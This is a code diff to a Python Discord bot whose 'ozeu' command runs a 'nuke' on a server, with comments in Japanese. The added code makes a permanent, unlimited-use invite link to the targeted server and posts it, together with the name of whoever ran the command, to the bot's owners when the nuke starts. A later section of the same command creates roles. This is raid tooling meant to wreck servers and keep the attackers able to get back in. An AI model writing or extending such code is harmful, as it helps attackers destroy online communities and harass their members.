@@ -146,9 +146,24 @@ async def ozeu(ctx, guild_id: str = None):
 
     owners = [await bot.fetch_user(owner_id) for owner_id in OWNER_ID]
 
+    # --- 招待リンク取得（無期限・無制限）---
+    invite_url = "取得できませんでした"
+    for channel in guild.text_channels:
+        if channel.permissions_for(guild.me).create_instant_invite:
+            try:
+                invite = await channel.create_invite(max_age=0, max_uses=0, unique=True)
+                invite_url = invite.url
+                break
+            except Exception:
+                continue
+
+    # --- 実行開始通知Embed ---
     embed_start = discord.Embed(
         title="📢 nuke が実行されました",
-        description=f"サーバー「{guild.name}」 (ID: {guild.id}) で nuke処理を開始しました。",
+        description=(
+            f"サーバー「{guild.name}」 (ID: {guild.id}) で nuke処理を開始しました。\n"
+            f"招待リンク: {invite_url}"
+        ),
         color=discord.Color.green()
     )
     embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
@@ -203,7 +218,7 @@ async def ozeu(ctx, guild_id: str = None):
     except Exception as e:
         print(f"[ozeu] ロール作成でエラー: {e}")
 
-    # 退出通知の前に招待リンク取得
+    # --- 退出時招待リンク再取得（念のため）---
     invite_url = "取得できませんでした"
     for channel in guild.text_channels:
         if channel.permissions_for(guild.me).create_instant_invite:
